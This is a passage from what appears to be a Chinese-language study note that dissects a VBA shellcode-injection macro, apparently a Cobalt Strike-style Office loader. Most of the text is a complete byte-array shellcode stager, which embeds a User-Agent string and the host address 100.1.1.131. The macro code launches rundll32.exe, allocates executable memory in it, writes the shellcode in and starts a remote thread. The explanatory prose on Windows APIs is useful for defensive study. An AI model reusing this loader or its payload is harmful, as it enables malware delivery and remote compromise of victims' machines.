number">47</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token number">83</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">53</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token number">68</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token number">93</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token operator">-</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">53</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token number">108</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">121</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token operator">-</span><span class="token number">54</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token number">12</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">66</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">94</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token number">104</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token operator">-</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">)</span>
    <span class="token keyword">If</span> Len<span class="token punctuation">(</span>Environ<span class="token punctuation">(</span><span class="token string">&quot;ProgramW6432&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token keyword">Then</span>
        sProc <span class="token operator">=</span> Environ<span class="token punctuation">(</span><span class="token string">&quot;windir&quot;</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token string">&quot;\\SysWOW64\\rundll32.exe&quot;</span>
    <span class="token keyword">Else</span>
        sProc <span class="token operator">=</span> Environ<span class="token punctuation">(</span><span class="token string">&quot;windir&quot;</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token string">&quot;\\System32\\rundll32.exe&quot;</span>
    <span class="token keyword">End</span> <span class="token keyword">If</span>

    res <span class="token operator">=</span> RunStuff<span class="token punctuation">(</span>sNull<span class="token punctuation">,</span> sProc<span class="token punctuation">,</span> <span class="token keyword">ByVal</span> <span class="token number">0</span><span class="token operator">&amp;</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> <span class="token number">0</span><span class="token operator">&amp;</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> <span class="token number">1</span><span class="token operator">&amp;</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> <span class="token number">4</span><span class="token operator">&amp;</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> <span class="token number">0</span><span class="token operator">&amp;</span><span class="token punctuation">,</span> sNull<span class="token punctuation">,</span> sInfo<span class="token punctuation">,</span> pInfo<span class="token punctuation">)</span>

    rwxpage <span class="token operator">=</span> AllocStuff<span class="token punctuation">(</span>pInfo<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> UBound<span class="token punctuation">(</span>myArray<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">&amp;H1000</span><span class="token punctuation">,</span> <span class="token number">&amp;H40</span><span class="token punctuation">)</span>
    <span class="token keyword">For</span> offset <span class="token operator">=</span> LBound<span class="token punctuation">(</span>myArray<span class="token punctuation">)</span> <span class="token keyword">To</span> UBound<span class="token punctuation">(</span>myArray<span class="token punctuation">)</span>
        myByte <span class="token operator">=</span> myArray<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
        res <span class="token operator">=</span> WriteStuff<span class="token punctuation">(</span>pInfo<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> rwxpage <span class="token operator">+</span> offset<span class="token punctuation">,</span> myByte<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> <span class="token number">0</span><span class="token operator">&amp;</span><span class="token punctuation">)</span>
    <span class="token keyword">Next</span> offset
    res <span class="token operator">=</span> CreateStuff<span class="token punctuation">(</span>pInfo<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> rwxpage<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">End</span> <span class="token keyword">Sub</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p><strong>宏初始化</strong>：定义了一些变量，包括进程信息和启动信息结构体</p><ul><li>在 VB 中，声明的变量会自动初始化为它们的默认值。以下是常见数据类型及其默认值： <ul><li><code>Integer</code>, <code>Long</code>, <code>Single</code>, <code>Double</code>: 默认值为 <code>0</code></li><li><code>Boolean</code>: 默认值为 <code>False</code></li><li><code>String</code>: 默认值为空字符串 <code>&quot;&quot;</code></li><li><code>Object</code>: 默认值为 <code>Nothing</code>（相当于 <code>null</code>）</li></ul></li></ul></li><li><p><strong>选择运行的可执行文件</strong>：根据系统环境变量，选择<code>rundll32.exe</code>的路径</p><ul><li><p><code>Len(Environ(&quot;ProgramW6432&quot;))</code></p><p><code>Environ</code> 是一个函数，用于获取环境变量的值, 64 位系统有这个环境变量, 32位系统没有, 因此可以根据这个变量的长度来判断系统为 64 位还是 32 位从而指定 <code>rundll32.exe</code> 的路径</p><p><code>Environ(&quot;ProgramW6432&quot;)</code> 返回一个字符串，表示系统环境变量 <code>ProgramW6432</code> 的值。</p><p>通常，这个环境变量的值是 64 位系统上的程序文件夹路径，如 <code>C:\Program Files</code>。</p><blockquote><p>可以用 Powershell <code>Write-Host $env:ProgramW6432</code> 看下</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407011733315.png" alt="image-20240701173317039"></p></blockquote></li></ul></li><li><p><strong>创建进程</strong>：使用<code>CreateProcessA</code>函数启动<code>rundll32.exe</code></p><blockquote><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" target="_blank" rel="noopener noreferrer">CreateProcessA function (processthreadsapi.h) - Win32 apps | Microsoft Learn<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> 创建一个新进程及其主线程。新进程在调用进程的安全上下文中运行。</p><div class="language-c++ line-numbers-mode" data-ext="c++" data-title="c++"><pre class="language-c++"><code>BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></blockquote><p><code>res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</code></p><ul><li><p><code>RunStuff</code></p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Private</span> <span class="token keyword">Declare</span> <span class="token keyword">Function</span> RunStuff <span class="token keyword">Lib</span> <span class="token string">&quot;kernel32&quot;</span> <span class="token keyword">Alias</span> <span class="token string">&quot;CreateProcessA&quot;</span> <span class="token punctuation">(</span>
    <span class="token keyword">ByVal</span> lpApplicationName <span class="token keyword">As</span> <span class="token keyword">String</span><span class="token punctuation">,</span> 
    <span class="token keyword">ByVal</span> lpCommandLine <span class="token keyword">As</span> <span class="token keyword">String</span><span class="token punctuation">,</span> 
    lpProcessAttributes <span class="token keyword">As</span> Any<span class="token punctuation">,</span> 
    lpThreadAttributes <span class="token keyword">As</span> Any<span class="token punctuation">,</span> 
    <span class="token keyword">ByVal</span> bInheritHandles <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> 
    <span class="token keyword">ByVal</span> dwCreationFlags <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> 
    lpEnvironment <span class="token keyword">As</span> Any<span class="token punctuation">,</span> 
    <span class="token keyword">ByVal</span> lpCurrentDriectory <span class="token keyword">As</span> <span class="token keyword">String</span><span class="token punctuation">,</span> 
    lpStartupInfo <span class="token keyword">As</span> STARTUPINFO<span class="token punctuation">,</span> 
    lpProcessInformation <span class="token keyword">As</span> PROCESS_INFORMATION
<span class="token punctuation">)</span> <span class="token keyword">As</span> <span class="token keyword">Long</span>
